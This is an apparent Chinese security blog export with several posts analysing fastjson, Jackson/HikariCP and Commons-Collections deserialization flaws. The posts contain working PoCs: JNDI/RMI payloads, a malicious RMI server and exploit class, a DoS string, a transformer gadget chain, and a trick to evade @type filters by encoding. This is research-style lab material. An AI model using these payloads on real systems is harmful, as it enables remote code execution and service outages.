      </categories>
      <tags>
        <tag>Java</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FastJson 拒绝服务攻击分析 (]]></title>
    <url>%2F2020%2F02%2F01%2Ffastjson%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[FastJson 拒绝服务攻击分析 (&lt;=1.2.59)最近在翻资料的时候发现了这样一个有意思的漏洞，简而言之，漏洞产生的原因是开发对输入数据考虑不周全，致使一个索引指针越界，导致拒绝服务的问题。比如我们输入16进制\x0a，而开发未考虑到恶意攻击者如果只输入\x，将会导致索引指针往后移动了两个指向了数据之外(越界)的地方. 漏洞复现pom.xml123456&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.59&lt;/version&gt;&lt;/dependency&gt; poc:12345678import com.alibaba.fastjson.JSON;public class test &#123; public static void main(String[] args)&#123; String DEATH_STRING = &quot;&#123;\&quot;a\&quot;:\&quot;\\x&quot;;//输入字符串长度为8 JSON.parse(DEATH_STRING); &#125;&#125; 漏洞分析在这篇文章里介绍了fastjson解析json串的机制：fastjson源码解析：JSON Token解析，这里我们记住bp为读取字符串的指针、sp为字符缓存区索引就好了: 直接来看解析16进制的代码位置：/parser/JSONLexerBase.java#scanString 跟进next函数：JSONScanner.java#next()先给索引指针进行了自增赋值，接着判断索引和实际长度的比较，如果索引比实际长度长或者相等则返回EOI,否则返回当前索引指向的字符：经过第一次的next处理，已经返回EOI(0x1A)了： 但是他又调用了一次next(即默认信任用户输入\x后跟两位字符)，此时索引的指针bp为9了，已经越界了： 然后经过putChar函数，break了switch分支，继续进行这个循环： 跟进isEOF函数：JSONScanner.java#isEOF：bp+1已经远大于len了，这个条件永远只能返回false。 跟进putChar函数，如果sp和缓存字符长度相对后，则申请一个char占用当前sbuf.length的两倍：所以最后的结果就是进入一个死循环且成倍申请内存： 最后在新版本1.2.60中，修改了isEOF函数的判断条件：并且增加了x1和x2的校验： 其次，在实际的测试中并没有理想中的拒绝服务效果，使用多线程占用也就从100多M涨到2.5G的样子。1234567891011121314import com.alibaba.fastjson.JSON;public class fastjsonDos implements Runnable&#123; public static void main(String[] args)&#123; new Thread(new fastjsonDos()).start(); new Thread(new fastjsonDos()).start(); new Thread(new fastjsonDos()).start(); &#125; public void run() &#123; String DEATH_STRING = "&#123;\"a\":\"\\x"; JSON.parse(DEATH_STRING); &#125;&#125; 后来学习到，java启动的时候可以通过-Xmx参数为jvm设置最大内存占用，默认为主机的四分之一。 其次Java的OutOfMemoryError是JVM内部的异常，是一个可捕获异常，并不会直接导致java进程被Kill掉，顶多线程挂掉。 在Linux下当应用程序内存超出内存上限时，会触发Out Of Memory Killer机制以保持系统空间正常运行，java默认最大1/4物理内存占用，还不太容易导致系统的OOM。 总的来说，漏洞危害有限，但是利用过程还是挺看细节的，有一些值得学习的点~ 参考文章： fastjson源码解析：JSON Token解析 FastJson拒绝服务漏洞分析 Linux内核OOM机制的详细分析]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>漏洞分析</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fastjson 反序列化触发流程分析]]></title>
    <url>%2F2020%2F01%2F30%2Ffastjson%20%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Fastjson 反序列化触发流程分析跟了几个三方组件组合利用的gadget chain，一直没有去跟fastjson底层实现，不免有很多疑问之处，这里记录一下分析一下fastjson触发流程。 fastjson 1.2.61 反序列化执行流程分析接着上一篇文章fastjson 1.2.61 远程代码执行漏洞分析(commons-configuration gadget)的poc出发：1234567public class exp &#123; public static void main(String[] args)&#123; String poc = "&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"; ParserConfig.global.setAutoTypeSupport(true); JSONObject exp = (JSONObject) JSON.parseObject(poc); &#125;&#125; 下断点跟进POC中的JSON.parseObject函数： 跟进parse(String text)函数，一顿套娃操作(java的重载特性：允许存在相同方法名，但不同参数个数及类型)通过重载的特性，调用了三个parse函数:12345678910111213141516171819// 148 public static Object parse(String text) &#123; return parse(text, DEFAULT_PARSER_FEATURE); &#125;// 179 public static Object parse(String text, int features) &#123; return parse(text, ParserConfig.getGlobalInstance(), features); &#125;// 164 public static Object parse(String text, ParserConfig config, int features) &#123; if (text == null) &#123; return null; &#125; DefaultJSONParser parser = new DefaultJSONParser(text, config, features); Object value = parser.parse(); parser.handleResovleTask(value); parser.close(); return value; &#125; 在DefaultJSONParser函数中初始化了一些变量配置信息，确认起始标志位为{： 接着进入parser.parse函数，解析json流程: 跟进DefaultJSONParser.java#parseObject，函数较长，截取部分：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990for (;;) &#123; lexer.skipWhitespace(); char ch = lexer.getCurrent(); if (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123; while (ch == ',') &#123; lexer.next(); lexer.skipWhitespace(); ch = lexer.getCurrent(); &#125; &#125; boolean isObjectKey = false; Object key; if (ch == '"') &#123; key = lexer.scanSymbol(symbolTable, '"'); lexer.skipWhitespace(); ch = lexer.getCurrent(); if (ch != ':') &#123; throw new JSONException("expect ':' at " + lexer.pos() + ", name " + key); &#125; &#125; else if (ch == '&#125;') &#123; lexer.next(); lexer.resetStringPosition(); lexer.nextToken(); if (!setContextFlag) &#123; if (this.context != null &amp;&amp; fieldName == this.context.fieldName &amp;&amp; object == this.context.object) &#123; context = this.context; &#125; else &#123; ParseContext contextR = setContext(object, fieldName); if (context == null) &#123; context = contextR; &#125; setContextFlag = true; &#125; &#125; return object; &#125; else if (ch == '\'') &#123; if (!lexer.isEnabled(Feature.AllowSingleQuotes)) &#123; throw new JSONException("syntax error"); &#125; key = lexer.scanSymbol(symbolTable, '\''); lexer.skipWhitespace(); ch = lexer.getCurrent(); if (ch != ':') &#123; throw new JSONException("expect ':' at " + lexer.pos()); &#125; &#125; else if (ch == EOI) &#123; throw new JSONException("syntax error"); &#125; else if (ch == ',') &#123; throw new JSONException("syntax error"); &#125; else if ((ch &gt;= '0' &amp;&amp; ch &lt;= '9') || ch == '-') &#123; lexer.resetStringPosition(); lexer.scanNumber(); try &#123; if (lexer.token() == JSONToken.LITERAL_INT) &#123; key = lexer.integerValue(); &#125; else &#123; key = lexer.decimalValue(true); &#125; if (lexer.isEnabled(Feature.NonStringKeyAsString)) &#123; key = key.toString(); &#125; &#125; catch (NumberFormatException e) &#123; throw new JSONException("parse number key error" + lexer.info()); &#125; ch = lexer.getCurrent(); if (ch != ':') &#123; throw new JSONException("parse number key error" + lexer.info()); &#125; &#125; else if (ch == '&#123;' || ch == '[') &#123; lexer.nextToken(); key = parse(); isObjectKey = true; &#125; else &#123; if (!lexer.isEnabled(Feature.AllowUnQuotedFieldNames)) &#123; throw new JSONException("syntax error"); &#125; key = lexer.scanSymbolUnQuoted(symbolTable); lexer.skipWhitespace(); ch = lexer.getCurrent(); if (ch != ':') &#123; throw new JSONException("expect ':' at " + lexer.pos() + ", actual " + ch); &#125; &#125; //... 总的来说就是一个大循环，里边嵌套了一堆if else，然后依据类型来判断，直到迭代器遍历完json数据为止，比如下面这个就是检测数字的判断：再比如这里，匹配到双引号，则用lexer.scanSymbol函数去获取双引号中间的值，并设置键名： 再来看这里，进行了特殊键@type匹配，并且!lexer.isEnabled(Feature.DisableSpecialKeyDetect)默认也是true跟进lexer.scanSymbol(symbolTable, &#39;&quot;&#39;)函数，看看它是如何获取类型名typeName的，JSONLexerBase.java#scanSymbol，同样的，也是一个迭代判断的过程，这里看一段比较有意思的是这一段代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051if (chLocal == '\\') &#123; if (!hasSpecial) &#123; hasSpecial = true; if (sp &gt;= sbuf.length) &#123; int newCapcity = sbuf.length * 2; if (sp &gt; newCapcity) &#123; newCapcity = sp; &#125; char[] newsbuf = new char[newCapcity]; System.arraycopy(sbuf, 0, newsbuf, 0, sbuf.length); sbuf = newsbuf; &#125; // text.getChars(np + 1, np + 1 + sp, sbuf, 0); // System.arraycopy(this.buf, np + 1, sbuf, 0, sp); arrayCopy(np + 1, sbuf, 0, sp); &#125; chLocal = next(); switch (chLocal) &#123; // 省略大量case case '\\': // 92 hash = 31 * hash + (int) '\\'; putChar('\\'); break; case 'x': char x1 = ch = next(); char x2 = ch = next(); int x_val = digits[x1] * 16 + digits[x2]; char x_char = (char) x_val; hash = 31 * hash + (int) x_char; putChar(x_char); break; case 'u': char c1 = chLocal = next(); char c2 = chLocal = next(); char c3 = chLocal = next(); char c4 = chLocal = next(); int val = Integer.parseInt(new String(new char[] &#123; c1, c2, c3, c4 &#125;), 16); hash = 31 * hash + val; putChar((char) val); break; default: this.ch = chLocal; throw new JSONException("unclosed.str.lit"); &#125; continue; &#125; 这段代码处理了以\x和\u开头的16进制字符串，也就是说我们可以用这种方式去编码转换typeName，也就是@type的value组件名再验证一下这个结果，将org的o进行编码： 再试试将@type的@进行编码都是可行的 因为在获取key值时，也是通过lexer.scanSymbol获取的(DefaultJSONParser.java#219行) 所以说，如果在开发代码中过滤了关键字@type或者组件名，可以用这个方法进行绕过 其后，在各种解码操作完成之后，在DefaultJSONParser.java#327行对其进行了AutoType校验： ParserConfig.java#checkAutoType经过长度、预期class、是否开启autotype等判断后，进行className的hash计算，先有一个白名单，接着判断是否在黑名单hash里。 为了防止安全研究者研究，fastjson 从1.2.42开始，将明文的黑名单换成了哈希过的黑名单，不过github上的大牛fuzz出了一份清单https://github.com/LeadroyaL/fastjson-blacklist 在TypeUtils.loadClass第三个参数为true时，会缓存到Mapping：loadClass函数，第三参数为cache为true时，则mappings.put(className, clazz);进行缓存。TypeUtils.java#loadClass12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123; if(className == null || className.length() == 0 || className.length() &gt; 128)&#123; return null; &#125; Class&lt;?&gt; clazz = mappings.get(className); if(clazz != null)&#123; return clazz; &#125; if(className.charAt(0) == '[')&#123; Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); &#125; if(className.startsWith("L") &amp;&amp; className.endsWith(";"))&#123; String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); &#125; try&#123; if(classLoader != null)&#123; clazz = classLoader.loadClass(className); if (cache) &#123; mappings.put(className, clazz); &#125; return clazz; &#125; &#125; catch(Throwable e)&#123; e.printStackTrace(); // skip &#125; try&#123; ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); if(contextClassLoader != null &amp;&amp; contextClassLoader != classLoader)&#123; clazz = contextClassLoader.loadClass(className); if (cache) &#123; mappings.put(className, clazz); &#125; return clazz; &#125; &#125; catch(Throwable e)&#123; // skip &#125; try&#123; clazz = Class.forName(className); if (cache) &#123; mappings.put(className, clazz); &#125; return clazz; &#125; catch(Throwable e)&#123; // skip &#125; return clazz;&#125; 而在TypeUtils.java的1105行 TypeUtils.getClassFromMapping函数，从mapping中取出类名。 继续跟进，在1127行有一段对未开启autoType的处理，又是一段黑白名单的处理： 接着加载了org.apache.commons.configuration2.JNDIConfiguration模块：同时这里判断了其是否有jsonType，jsonType = visitor.hasJsonType();，是fastjson中定制序列化的特性，参考文档Fastjson 定制序列化和Fastjson JSONField介绍 挖坑，这里用到了ASM读写字节码的类库，参考文章深入ASM源码之ClassReader、ClassVisitor、ClassWriter。后来还看到可以用注解有JsonType的class进行gadget chain构造，先挖坑，https://xz.aliyun.com/t/7107 继续往下跟，这里只要开了autoTypeSupport就会将我们的class缓存进mapping(cacheClass为true即缓存) 最后返回class。通过autotype的检测，进行反序列化操作 到这里基本从源码对fastjson解析json、@type特殊类型解析、autotype检测有了一个了解。 fastjson 1.2.48 JdbcRowSetImpl gadget 分析(缓存绕过autotype)pom.xml添加下面这段代码123456&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.47&lt;/version&gt;&lt;/dependency&gt; poc:1234567891011import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class test &#123; public static void main(String[] args)&#123; String poc1 = "&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;"; String poc2 = "&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true&#125;"; JSON.parse(poc1); JSON.parse(poc2); &#125;&#125; 或者使用数组或者在web服务连续发两个poc包即可：123456789import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class test &#123; public static void main(String[] args)&#123; String poc2 = "[&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true&#125;]"; JSON.parseObject(poc2); &#125;&#125; 调试分析下断点根进第一个poc： 和上文1.2.61调试的过程类似DefaultJSONParser函数初始化配置，parser.parse解析，再到parseObject函数，这里直接来看config.checkAutoType在不开启autotype的情况：ParserConfig.java#checkAutoType 最开始进行class名的哈希运算，然后是开启autotype下的黑白名单检测，然后还没到后边未开启autotype的if条件里，就直接return了。 回到DefaultJSONParser.java#parseObject函数跟进deserializer.deserialze函数，根据val字段来获取objVal： 继续往下，在335行进行了一个Class类的判断，然后调用typeUtils.loadClass函数： TypeUtils.java#loadClass(String className, ClassLoader classLoader)用重载的方式，并且设置默认为true的缓存操作，最后在TypeUtils.java#1242行将com.sun.rowset.JdbcRowSetImpl加到mapping缓存中： 这就导致了解析第二个poc时，绕过了autotype校验，从缓存mapping中加载：最终实例化该类，导致RCE。 最后这篇文章通过fastjson1.2.61 commons-configuration gadget的POC动态调试入手，分析fastjson反序列化解析json流程，分析了一下源码的\u和\x的16进制解码操作，以及缓存机制。 同时分析了一下在fastjson 1.2.48以下TypeUtils.loadClass缓存问题，即无需开autotype可以命令执行。 接下来的时间打算研究一下高版本jdk绕过远程类的加载问题。 参考文章： FastJson 文档链接 W3Cschool:Fastjson API中文版 fastjson源码解析 fastjson反序列化RCE核心-四个关键点分析 https://paper.seebug.org/994/]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>漏洞分析</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fastjson 1.2.61 远程代码执行漏洞分析(commons-configuration gadget)]]></title>
    <url>%2F2020%2F01%2F28%2Ffastjson%201.2.61%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[在fastjson 1.2.61的版本中，增加了autoType的安全组件黑名单commons-configuration，成功绕过了黑名单限制，利用反序列化特性造成远程代码执行，该组件是java应用程序的配置管理类，用于协助管理各种格式的配置文件。 漏洞复现Idea创建项目，选择maven，jdk版本1.8.0_73，在pom.xml中添加如下代码,自动加载依赖： fastjson:1.2.60 commons-configuration2: 2.6 1234567891011121314&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.60&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-configuration2 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-configuration2&lt;/artifactId&gt; &lt;version&gt;2.6&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 同样的，按照上一篇文章文章中写的，搭建一个恶意的RMI服务，使之加载。poc:12345678910import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class exp &#123; public static void main(String[] args)&#123; String poc = "&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"; ParserConfig.global.setAutoTypeSupport(true); JSON.parseObject(poc); &#125;&#125; 漏洞分析在上一篇文章中写了fastjson在反序列化json数据时，会自动调用其属性XX的setXX和getXX方法，如果其中有JNDI Reference注入漏洞，则可以造成RCE的效果。 在下面这段代码中，我们可以知道在使用JSON.parseObject反序列化json数据时，会调用所有属性的get方法，以及相关属性的set方法。1234567891011121314151617181920212223242526272829303132import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;import com.alibaba.fastjson.JSONObject;public class User &#123; private int age; private String name; public int getAge() &#123; System.out.println("getAge方法被自动调用！"); return age; &#125; public void setAge(int age) &#123; System.out.println("setAge方法被自动调用！"); this.age = age; &#125; public String getName() &#123; System.out.println("getName方法被自动调用！"); return name; &#125; public void setName(String name) &#123; System.out.println("setName方法被自动调用！"); this.name = name; &#125; public static void main(String[] args) &#123; //使用@type指定该JSON字符串应该还原成何种类型的对象 String userInfo = "&#123;\"@type\":\"test.User\",\"name\":\"passer6y\"&#125;"; //开启setAutoTypeSupport支持autoType ParserConfig.global.setAutoTypeSupport(true); //反序列化成User对象 JSONObject user = JSON.parseObject(userInfo); &#125;&#125; 从下图我们知道，这里没有设置age属性，但是getAge方法被调用了，且先调用set方法后调用get方法。 再回过头来看这个poc:1String poc = "&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"; 跟进这个组件的setPrefix方法：再跟一下成员变量this.prefix：所以漏洞成因就显而易见了，通过第一步的setPrefix种入成员变量this.prefix为恶意rmi服务地址，接着fastjson自动调用全部get方法，没有设置baseContext成员变量，自然就触发了：1(Context)this.getContext().lookup(this.prefix == null ? "" : this.prefix) 那么问题来了，this.getContext()是怎么设置的呢？123public Context getContext() &#123; return this.context;&#125; 获取了成员变量this.context，在构造方法中我们可以看到一顿套娃的操作，无参构造函数调用单参数构造函数，调用双参数构造函数，将new InitialContext()赋给了成员变量this.context最终导致漏洞产生。 索然无味，仅仅对gadget chain进行了简单分析，对fastjson的关键代码分析欠缺，接下里的任务就是搞懂fastjson漏洞触发的条件以及原理。 最后漏洞影响fastjson版本：version &lt;= 1.2.61。修复也就是多了个组件黑名单。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-14540 远程代码执行漏洞分析]]></title>
    <url>%2F2020%2F01%2F28%2FCVE-2019-14540%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[fastjson入门下载fastjson最新版jar包下载，Idea 新建项目-&gt;选择jdk1.7—&gt;选择File &gt; project structure &gt; Modules &gt; dependencies &gt; + JARS or directories -&gt;加载下载的组件 写一个User类，接着使用fastjson解析一段json数据：1234567891011121314151617181920212223242526272829303132333435package test;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;import com.alibaba.fastjson.JSONObject;public class User &#123; private int age; private String name; public int getAge() &#123; System.out.println("getAge方法被自动调用！"); return age; &#125; public void setAge(int age) &#123; System.out.println("setAge方法被自动调用！"); this.age = age; &#125; public String getName() &#123; System.out.println("getName方法被自动调用！"); return name; &#125; public void setName(String name) &#123; System.out.println("setName方法被自动调用！"); this.name = name; &#125; public static void main(String[] args) &#123; //使用@type指定该JSON字符串应该还原成何种类型的对象 String userInfo = "&#123;\"@type\":\"test.User\",\"name\":\"passer6y\", \"age\":18&#125;"; //开启setAutoTypeSupport支持autoType ParserConfig.global.setAutoTypeSupport(true); //反序列化成User对象 JSONObject user = JSON.parseObject(userInfo); //User user = (User) JSON.parse(userInfo); 只会调用setXX方法 //System.out.println(user.getName()); &#125;&#125; 在使用JSON.parseObject解析json时，代码中的setXX、getXX方法自动调用，如果函数中存在一些敏感操作，则可能导致漏洞产生。 JSON.parse只会调用setXX方法，不会自动调用getXX 另外，将json中的age元素删除后，使用JSON.parseObject，仍然会调用getAge方法。 也就是说parseObject调用全部属性的getXX方法，和设置属性的setXX方法 漏洞复现分析10分钟，复现3小时，环境无限采坑…（maven真香 RMI服务端搭建这里使用了RMI动态加载远程class文件，参考笔记：深入理解RMI&amp;JNDI 使用javac将下面代码编译成class文件，放到web服务器中,这里使用nginx(https://127.0.0.1/Exploit.class)123456789101112131415public class Exploit &#123; public Exploit() &#123; try &#123; if (System.getProperty("os.name").toLowerCase().startsWith("win")) &#123; Runtime.getRuntime().exec("calc.exe"); &#125; else if (System.getProperty("os.name").toLowerCase().startsWith("mac")) &#123; Runtime.getRuntime().exec("open /Applications/Calculator.app"); &#125; else &#123; System.out.println("No calc for you!"); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 再起一个RMI服务端，动态加载远程class文件:1234567891011121314151617181920212223import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import javax.naming.Reference; import com.sun.jndi.rmi.registry.ReferenceWrapper;public class server &#123; public static void main(String[] args) &#123; try &#123; //创建RMI Registry，默认监听1099端口 Registry registry = LocateRegistry.createRegistry(1099); String remote_class = "https://127.0.0.1/"; //Reference对象代表存在于JNDI以外的对象的引用 Reference reference = new Reference("Exploit", "Exploit", remote_class); ReferenceWrapper re = new ReferenceWrapper(reference); //把Reference对象绑定到Registry，客户端可以通过在Registry查找Exploit获取到re对象 registry.bind("Exploit",re); System.out.println("RMI服务已经启动...."); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 漏洞环境搭建&amp;复现 jdk版本：jdk1.8.0_73 jackson版本：2.10.0 HikariCP版本：3.3.1 fastjson版本：1.2.53idea创建maven项目，在pom.xml添加依赖：12345678910111213141516171819 &lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.10.0.pr1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.zaxxer/HikariCP --&gt; &lt;dependency&gt; &lt;groupId&gt;com.zaxxer&lt;/groupId&gt; &lt;artifactId&gt;HikariCP&lt;/artifactId&gt; &lt;version&gt;3.3.1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.53&lt;/version&gt;&lt;/dependencies&gt; jackson poc:12345678910import com.fasterxml.jackson.databind.ObjectMapper;public class test &#123; public static void main(String[] args) throws Exception &#123; String json = "[\"com.zaxxer.hikari.HikariConfig\",&#123;\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125;]"; ObjectMapper objectMapper = new ObjectMapper(); objectMapper.enableDefaultTyping(); objectMapper.readValue(json,Object.class); &#125;&#125; fastjson poc:12345678910import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class fastjsonEXP &#123; public static void main(String[] args)&#123; ParserConfig.global.setAutoTypeSupport(true); JSON.parseObject("&#123;\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"); &#125;&#125; 漏洞分析从上文中fastjson入门部分我们知道，在解析json数据的时候会自动调用setXX方法，在HikariCP这个组件中，HikariConfig.class中可以看到setMetricRegistry方法调用了getObjectOrPerformJndiLookup方法：跟进其中，调用了InitialContext.lookup(object)很明显的jndi Reference注入。 所以我们在构造poc的时候，利用fastjson的@type加载该对象com.zaxxer.hikari.HikariConfig，使用metricRegistry属性，去触发setMetricRegistry方法，最终使之加载我们恶意的RMI服务程序。1&#123;\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125; 同样的，在jackson中也有这样的问题：1[\"com.zaxxer.hikari.HikariConfig\",&#123;\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125;] 最后通过上面的分析，我们也可以发现其实这是多组件组合导致的远程代码执行，需要环境中使用了fastjson或者jackson库，同时还使用了第三方组件HikariCP导致的，而官方的修复也只是将该扩展添加进了黑名单(fastjson-blacklist、jackson修复commit)。 参考文章： curz0n:CVE-2019-14540远程代码执行漏洞分析&amp;复现 b1ue:Java 反序列化漏洞始末（4）— jackson]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java入坑：Apache-Commons-Collections-3.1 反序列化漏洞分析]]></title>
    <url>%2F2020%2F01%2F24%2FApache-Commons-Collections-3.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[环境搭建组件下载：https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1 Idea 新建项目-&gt;选择jdk1.7—&gt;选择File &gt; project structure &gt; Modules &gt; dependencies &gt; + JARS or directories -&gt;加载下载的组件 漏洞复现poc:123456789101112131415161718192021222324252627282930import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class EvalObject &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app/"&#125;) &#125;; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChain Map innerMap = new HashMap(); innerMap.put("value", "value"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //触发漏洞 Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue("foobar"); &#125; 漏洞分析step1漏洞点在/commons-collections-3.1-sources.jar!/org/apache/commons/collections/functors/InvokerTransformer.java1234567891011121314151617181920212223242526public class InvokerTransformer implements Transformer, Serializable &#123; //105行 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; &#125; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist"); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed"); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex); &#125; &#125;&#125; 通过实现/commons-collections-3.1-sources.jar!/org/apache/commons/collections/Transformer.java Transformer接口，InvokerTransformer构造方法在实例化的时候传入参数函数方法名以及参数名，transform方法使用java反射机制得以调用任意方法。Transformer接口:123public interface Transformer &#123; public Object transform(Object input);&#125; Java反射机制即参数传入一个对象，然后通过getClass、getMethod等方法去获取其所属的类、所拥有的对象。 在Java中一切皆对象，调用系统命令的代码通常为：1Runtime.getRuntime().exec("open -a Calculator"); 可以通过构造这段代码实现命令执行：12345678public class EvalObject &#123; public static void main(String[] args) throws Exception &#123; InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open -a Calculator"&#125;); invokerTransformer.transform(Runtime.getRuntime()); &#125;&#125; 但是我们知道反序列化后一般只需要执行readObject函数即可，如果直接序列化invokerTransformer对象，那么readObject之后的对象还需要主动调用transform(Runtime.getRuntime())函数才能得以命令执行，显然是不太现实的。demo:12345678910111213141516171819202122232425262728293031323334import java.io.*;import java.lang.Runtime;import org.apache.commons.collections.functors.InvokerTransformer;public class test2 &#123; public static void main(String[] args) throws Exception &#123; InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]&#123; String.class&#125;, new Object[] &#123;"open -a Calculator"&#125;); serialize(invokerTransformer); // 反序列化完了还得调对象的transform方法 InvokerTransformer obj = (InvokerTransformer) 